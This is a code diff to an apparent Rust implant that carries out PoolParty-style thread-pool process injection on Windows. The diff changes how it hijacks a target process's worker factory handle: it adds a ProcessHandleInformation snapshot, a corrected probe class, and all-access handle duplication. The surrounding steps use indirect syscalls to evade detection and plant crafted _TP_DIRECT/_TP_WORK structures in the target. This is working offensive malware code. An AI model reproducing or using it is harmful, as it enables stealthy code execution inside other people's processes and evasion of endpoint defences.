@@ -26,11 +26,12 @@
 //!
 //! 1. Resolve the indirect-syscall runtime (no direct syscall instruction in
 //!    implant memory — RIP-of-syscall stays inside ntdll).
-//! 2. Hijack a handle to the target's thread-pool *worker factory* by walking
-//!    the system handle table (`SystemExtendedHandleInformation`), duplicating
-//!    every `TppWorkerThread`-owned handle into the implant, and probing each
-//!    duplicate with `NtQueryInformationWorkerFactory(WorkerFactoryBasicTimer)`
-//!    — a hit returns the worker factory handle.
+//! 2. Hijack a handle to the target's thread-pool *worker factory*: prefer
+//!    `NtQueryInformationProcess(ProcessHandleInformation=51)` on the target
+//!    (SafeBreach / Teach2Breach), fall back to the system-wide
+//!    `SystemExtendedHandleInformation` table. Duplicate each handle and
+//!    probe with `NtQueryInformationWorkerFactory(WorkerFactoryBasicInformation=7)`
+//!    — the only documented QUERY class. A hit returns the worker factory handle.
 //! 3. Allocate an RW stub region in the target (`NtAllocateVirtualMemory`,
 //!    indirect), write a crafted `_TP_DIRECT` (callback = section view) +
 //!    `_TP_WORK` (direct = the TP_DIRECT) into it
@@ -275,9 +276,17 @@ type NtSetInformationWorkerFactoryFn = unsafe extern "system" fn(
     u32,           // WorkerFactoryInformationLength
 ) -> i32;
 
-/// `WorkerFactoryBasicTimer` info class for `NtQueryInformationWorkerFactory`.
-/// Reading it is the cheap probe: success ⇒ the handle is a worker factory.
-const WORKER_FACTORY_BASIC_TIMER: u32 = 2;
+/// `WorkerFactoryBasicInformation` (7) — the only documented QUERY class
+/// (`QUERY_WORKERFACTORYINFOCLASS` in SafeBreach PoolParty; phnt). Classes
+/// 0–2 are SET timeouts (`WorkerFactoryTimeout` / `RetryTimeout` /
+/// `IdleTimeout`). Hosted Server 2025 `inject_pool` 0x9 used class 2 against
+/// a 32-byte buffer, which cannot identify a `TpWorkerFactory`.
+const WORKER_FACTORY_BASIC_INFORMATION: u32 = 7;
+
+/// Size of `WORKER_FACTORY_BASIC_INFORMATION` plus slack (phnt: ~116 bytes
+/// on x64). A 32-byte probe with class 7 returns `STATUS_INFO_LENGTH_MISMATCH`
+/// and would be mistaken for a non-factory.
+const WORKER_FACTORY_BASIC_INFO_BUF: usize = 256;
 
 /// `WorkerFactoryTimeout` info class for `NtSetInformationWorkerFactory`. The
 /// SafeBreach TP_WORK variant feeds the crafted work item pointer here; the
@@ -297,6 +306,16 @@ const SYSTEM_EXTENDED_HANDLE_INFORMATION: u32 = 64;
 /// factory purely by `NtQueryInformationWorkerFactory` succeeding — see
 /// [`hijack_worker_factory`].
 const DUPLICATE_SAME_ACCESS: u32 = 0x0002;
+
+/// `STANDARD_RIGHTS_REQUIRED | WORKER_FACTORY_{RELEASE,WAIT,SET,QUERY,READY,SHUTDOWN}`
+/// (SafeBreach `WORKER_FACTORY_ALL_ACCESS`). DuplicateHandle requests this
+/// first so `NtQueryInformationWorkerFactory` is allowed; SAME_ACCESS is the
+/// fallback when the target handle cannot be opened with these rights.
+const WORKER_FACTORY_ALL_ACCESS: u32 = 0x000F_003F;
+
+/// `NtQueryInformationProcess` info class 51 — snapshot of *this* process's
+/// handle table (Windows 8+). Safer than walking the system-wide table.
+const PROCESS_HANDLE_INFORMATION: u32 = 51;
 
 // ============================================================================
 // pool_party_inject
@@ -963,29 +982,38 @@ unsafe fn hijack_worker_factory(
 ) -> Result<*mut c_void, String> {
     let (qsi, dup_handle) = hijack_resolve_fns()?;
 
-    let buf = hijack_fetch_table(qsi)?;
-
-    // ---- 3. Walk SYSTEM_HANDLE_INFORMATION_EX ----
-    // Kernel payload: u64 NumberOfHandles at offset 0x00, then a dense array of
-    // SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entries (stride 0x28 on x64). The pure
-    // parse lives in `collect_target_handles` (unit-tested with a synthetic
-    // buffer); here each candidate handle is duplicated + probed in turn.
-    let mut candidates = nyx_implant_core::heap::Vec::new();
-    collect_target_handles(&buf, target_pid, &mut candidates);
-    // g6 diagnosis (selftest builds only): 0 candidates = the table parse or
-    // the pid filter found nothing (layout/pid mismatch); >0 with no probe
-    // hit = every DuplicateHandle/NtQueryInformationWorkerFactory failed or
-    // the target genuinely holds no worker factory. The bare error string
-    // cannot separate these (2026-08-24 VM: sleeper target, "no
-    // worker-factory handle").
+    // Prefer the target's own handle snapshot (SafeBreach HandleHijacker /
+    // Teach2Breach ProcessHandleInformation). The system-wide table can miss
+    // a brand-new child's factory or fail the size retry on Server 2025.
+    let mut proc_candidates = nyx_implant_core::heap::Vec::new();
+    if let Some(qip) = hijack_resolve_qip() {
+        unsafe { collect_from_process(qip, target_h, &mut proc_candidates) };
+    }
     #[cfg(feature = "selftest")]
     {
-        let mut s = String::from("candidates=");
-        s.push_str(&crate::selftests::dec_u32(candidates.len() as u32));
+        let mut s = String::from("proc=");
+        s.push_str(&crate::selftests::dec_u32(proc_candidates.len() as u32));
+        crate::selftests::write_marker("nyx_g6_pool_scan.proc", &s);
+    }
+    for handle_val in &proc_candidates {
+        if let Ok(dup) = hijack_probe_handle(dup_handle, query_wf, target_h, *handle_val) {
+            return Ok(dup);
+        }
+    }
+
+    let buf = hijack_fetch_table(qsi)?;
+    let mut sys_candidates = nyx_implant_core::heap::Vec::new();
+    collect_target_handles(&buf, target_pid, &mut sys_candidates);
+    #[cfg(feature = "selftest")]
+    {
+        let mut s = String::from("proc=");
+        s.push_str(&crate::selftests::dec_u32(proc_candidates.len() as u32));
+        s.push_str(" sys=");
+        s.push_str(&crate::selftests::dec_u32(sys_candidates.len() as u32));
         crate::selftests::write_marker("nyx_g6_pool_scan", &s);
     }
 
-    for handle_val in candidates {
+    for handle_val in sys_candidates {
         if let Ok(dup) = hijack_probe_handle(dup_handle, query_wf, target_h, handle_val) {
             return Ok(dup);
         }
@@ -1012,6 +1040,88 @@ unsafe fn hijack_resolve_fns() -> Result<(NtQuerySystemInformationFn, DuplicateH
         )
     };
     Ok((qsi, dup_handle))
+}
+
+type NtQueryInformationProcessFn = unsafe extern "system" fn(
+    *mut c_void, // ProcessHandle
+    u32,         // ProcessInformationClass
+    *mut c_void, // ProcessInformation
+    u32,         // ProcessInformationLength
+    *mut u32,    // ReturnLength
+) -> i32;
+
+unsafe fn hijack_resolve_qip() -> Option<NtQueryInformationProcessFn> {
+    let addr = unsafe { resolve::export_addr(b"ntdll.dll", b"NtQueryInformationProcess") }?;
+    Some(unsafe { core::mem::transmute(addr) })
+}
+
+/// Snapshot the target's handle table via ProcessHandleInformation (51).
+unsafe fn collect_from_process(
+    qip: NtQueryInformationProcessFn,
+    target_h: *mut c_void,
+    out: &mut nyx_implant_core::heap::Vec<usize>,
+) {
+    const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC000_0004u32 as i32;
+    let mut cap: u32 = 0x1_0000;
+    for _ in 0..4 {
+        let mut buf = nyx_implant_core::heap::vec![0u8; cap as usize];
+        let mut ret_len: u32 = 0;
+        let st = unsafe {
+            qip(
+                target_h,
+                PROCESS_HANDLE_INFORMATION,
+                buf.as_mut_ptr() as *mut c_void,
+                cap,
+                &mut ret_len,
+            )
+        };
+        if st >= 0 {
+            collect_process_handles(&buf, out);
+            return;
+        }
+        if st != STATUS_INFO_LENGTH_MISMATCH {
+            return;
+        }
+        let next = if ret_len > cap {
+            ret_len.saturating_add(0x1000)
+        } else {
+            cap.saturating_mul(2)
+        };
+        if next > QSI_MAX_CAP || next <= cap {
+            return;
+        }
+        cap = next;
+    }
+}
+
+/// Walk `PROCESS_HANDLE_SNAPSHOT_INFORMATION` (phnt / SafeBreach Native.hpp):
+/// ```text
+///   +0x00 ULONG_PTR NumberOfHandles
+///   +0x08 ULONG_PTR Reserved
+///   +0x10 PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[]  (stride 0x28)
+///         +0x00 HANDLE HandleValue
+/// ```
+fn collect_process_handles(buf: &[u8], out: &mut nyx_implant_core::heap::Vec<usize>) {
+    const HANDLES_OFF: usize = 0x10;
+    const ENTRY_STRIDE: usize = 0x28;
+    if buf.len() < 8 {
+        return;
+    }
+    let count = unsafe { (buf.as_ptr() as *const u64).read_unaligned() };
+    let max_entries = buf.len().saturating_sub(HANDLES_OFF) / ENTRY_STRIDE;
+    let count = count.min(max_entries as u64) as usize;
+    for i in 0..count {
+        let entry = HANDLES_OFF + i * ENTRY_STRIDE;
+        if entry + 8 > buf.len() {
+            break;
+        }
+        let handle_val =
+            unsafe { (buf.as_ptr().add(entry) as *const usize).read_unaligned() };
+        if handle_val == 0 || handle_val == (-1isize) as usize {
+            continue;
+        }
+        out.push(handle_val);
+    }
 }
 
 /// Size the handle table with a length-only query, fetch the full
@@ -1134,41 +1244,53 @@ unsafe fn hijack_probe_handle(
     // GetCurrentProcess pseudo-handle = (HANDLE)-1 (the implant's own process).
     const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
 
-    // Duplicate this handle into the implant with DUPLICATE_SAME_ACCESS.
+    // Prefer WORKER_FACTORY_ALL_ACCESS so QUERY/SET are granted (SafeBreach
+    // HijackProcessHandle). SAME_ACCESS is the fallback.
     let mut dup: *mut c_void = core::ptr::null_mut();
-    let ok = unsafe {
+    let ok_all = unsafe {
         dup_handle(
             target_h,
             handle_val as *mut c_void,
             CUR_PROCESS,
             core::ptr::addr_of_mut!(dup),
+            WORKER_FACTORY_ALL_ACCESS,
             0,
             0,
-            DUPLICATE_SAME_ACCESS,
         )
     };
-    if ok == 0 || dup.is_null() {
-        // Not duplicatable (access denied, or wrong object type) — skip.
-        return Err(());
+    if ok_all == 0 || dup.is_null() {
+        dup = core::ptr::null_mut();
+        let ok_same = unsafe {
+            dup_handle(
+                target_h,
+                handle_val as *mut c_void,
+                CUR_PROCESS,
+                core::ptr::addr_of_mut!(dup),
+                0,
+                0,
+                DUPLICATE_SAME_ACCESS,
+            )
+        };
+        if ok_same == 0 || dup.is_null() {
+            return Err(());
+        }
     }
 
-    // Probe: is this duplicate a worker factory?
-    // NtQueryInformationWorkerFactory returns STATUS_OBJECT_TYPE_MISMATCH
-    // (0xC0000024) for non-worker-factory handles; STATUS_SUCCESS for a
-    // real one. A tiny stack buffer is enough for the basic-timer query.
-    let mut probe: [u8; 32] = [0u8; 32];
+    // Probe with WorkerFactoryBasicInformation (7) into a buffer large
+    // enough for WORKER_FACTORY_BASIC_INFORMATION. STATUS_SUCCESS ⇒ factory.
+    // STATUS_OBJECT_TYPE_MISMATCH (0xC0000024) ⇒ not a factory.
+    let mut probe = [0u8; WORKER_FACTORY_BASIC_INFO_BUF];
     let mut probe_len: u32 = 0;
     let qst = unsafe {
         query_wf(
             dup,
-            WORKER_FACTORY_BASIC_TIMER,
+            WORKER_FACTORY_BASIC_INFORMATION,
             probe.as_mut_ptr() as *mut c_void,
             probe.len() as u32,
             &mut probe_len,
         )
     };
     if qst >= 0 {
-        // Hit — this is a worker-factory handle owned by the target.
         return Ok(dup);
     }
     // Not a worker factory; close the duplicate and keep scanning.
@@ -1350,6 +1472,22 @@ mod tests {
             &mut tiny,
         );
         assert!(tiny.is_empty());
+    }
+
+    /// PROCESS_HANDLE_SNAPSHOT_INFORMATION: count @0, Handles @0x10, stride
+    /// 0x28, HandleValue @ +0x00 of each entry (SafeBreach Native.hpp).
+    #[test]
+    fn process_handle_snapshot_parse() {
+        const HANDLES_OFF: usize = 0x10;
+        const ENTRY_STRIDE: usize = 0x28;
+        let mut buf = [0u8; HANDLES_OFF + 2 * ENTRY_STRIDE];
+        buf[0..8].copy_from_slice(&2u64.to_le_bytes());
+        buf[HANDLES_OFF..HANDLES_OFF + 8].copy_from_slice(&0x10u64.to_le_bytes());
+        let e1 = HANDLES_OFF + ENTRY_STRIDE;
+        buf[e1..e1 + 8].copy_from_slice(&0x20u64.to_le_bytes());
+        let mut out = nyx_implant_core::heap::Vec::new();
+        collect_process_handles(&buf, &mut out);
+        assert_eq!(out.as_slice(), &[0x10usize, 0x20usize]);
     }
 
     /// A buffer laid out with Handles at 0x08 (legacy docs that omitted
